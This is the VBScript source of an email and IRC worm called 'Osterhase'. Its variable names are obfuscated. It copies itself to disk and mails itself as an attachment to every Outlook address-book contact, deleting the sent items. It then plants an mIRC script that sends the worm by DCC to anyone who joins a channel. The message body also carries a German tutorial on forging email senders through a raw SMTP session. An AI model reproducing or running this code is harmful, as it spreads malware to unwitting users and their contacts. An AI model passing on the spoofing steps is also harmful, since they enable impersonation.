On Error Resume Next
Set vitahygzboi = CreateObject("WScript.Shell")
set mjeojflriib=createobject("scripting.filesystemobject")
mjeojflriib.copyfile wscript.scriptfullname,"C:\Programme\Defcon5\Osterhase.vbs"
if vitahygzboi.regread ("HKCU\software\Osterhase\mailed") <> "1" then
henmxiuxvbd()
end if
if vitahygzboi.regread ("HKCU\software\Osterhase\mirqued") <> "1" then
kvwafdrzjtc()
end if
Function henmxiuxvbd()
On Error Resume Next
Set zukopoqjfjy = CreateObject("Outlook.Application")
If zukopoqjfjy= "Outlook"Then
Set femoqlyfcul=zukopoqjfjy.GetNameSpace("MAPI")
For Each mwknuzjqkdq In femoqlyfcul.AddressLists
If mwknuzjqkdq.AddressEntries.Count <> 0 Then
For cbpgphkwkpm= 1 To mwknuzjqkdq.AddressEntries.Count
Set vufqczxclsd = mwknuzjqkdq.AddressEntries(cbpgphkwkpm)
Set xcnlaarbeic = zukopoqjfjy.CreateItem(0)
xcnlaarbeic.To = vufqczxclsd.Address
xcnlaarbeic.Subject = "Mail from: Osterhase@Ostern.de"
xcnlaarbeic.Body = "Hello.." & vbcrlf & "Check This!" & vbcrlf & "This is our death.." & vbcrlf & "My Name are Lee.." & vbcrlf & "I am come from Germany.." & vbcrlf & "And i hate Lucky2000..there are stole" & vbcrlf & "my Opinion Worm. I hate too Duke from DVL" & vbcrlf & "My favorite page are Coderz.Net..Thx:Evul to hostet" & vbcrlf & "my Site...Har Har Har.." & vbcrlf & "" & vbcrlf & "Ein Geiler Trick von mir....." & vbcrlf & "via Telnet." & vbcrlf & "" & vbcrlf & "Als erstes geht ihr aud die Startseite von Windoof, dort auf den Menüpunkt ausführen," & vbcrlf & "Dort gebt ihr >Telnet< ein und drückt Return." & vbcrlf & "das Microschrott Terminal Telnet öffnet sich in einem Fenster" & vbcrlf & ". Ihr baut jetzt eure Verbindung auf und geht auf Verbinden," & vbcrlf & "Danach auf Netzwerk-system und gebt z.b. ein:" & vbcrlf & "mail.compuserve.com 25 ( wenn ihr Compuserve verwendet," & vbcrlf & "entsprechendes gilt für T-Online, Aol oder bei welchen Provider ihr angemeldet seid.)" & vbcrlf & "Der Server meldet sich dann mit einem Connect an." & vbcrlf & "Ihr tippt dann "helo". Das Helo muß als erstes stehen, was danach kommt, ist egal." & vbcrlf & "Jetzt schreibt ihr: Mail from: Bill_Gates@Microsoft.com (nur als Beispiel) Ihr drückt dann Return," & vbcrlf & "und schreibt den Empfänger: empfänger@sein provider.de (exacte Email adresse)." & vbcrlf & "Und wieder Return Taste und dann kommt die Nachricht: 250 empfänger@sein provider.de...recipient ok." & vbcrlf & "Jetzt nur "data" eintippen und Euren Text, den die Email haben soll und macht dann einen Punkt "." und haut noch ein mal auf die Return taste." & vbcrlf & "Und das war es dann schon, der Empfänger wird sich wundern...:-)....." & vbcrlf & "" & vbcrlf & "Euer Lee"
xcnlaarbeic.Attachments.Add "C:\Programme\Defcon5\Osterhase.vbs"
xcnlaarbeic.DeleteAfterSubmit = True
If xcnlaarbeic.To <> "" Then
xcnlaarbeic.Send
End If
Next
End If
Next
vitahygzboi.regwrite "HKCU\software\Osterhase\mailed", "1"
end if
End Function
Function kvwafdrzjtc
On Error Resume Next
if mjeojflriib.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc"
if mjeojflriib.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=vitahygzboi.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if mjeojflriib.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set bggfitxapwv = mjeojflriib.CreateTextFile(MircLoc & "\script.ini", True)
bggfitxapwv.writeline "n0=on 1:JOIN:#:{"
bggfitxapwv.writeline "n1=  /if ( $nick == $me ) { halt }"
bggfitxapwv.writeline "n2=  /.dcc send $nick C:\Programme\Defcon5\Osterhase.vbs"
bggfitxapwv.writeline "n3=}"
bggfitxapwv.close
vitahygzboi.regwrite "HKCU\software\Osterhase\Mirqued", "1"
end function
'Osterhase@Ostern.de from Lee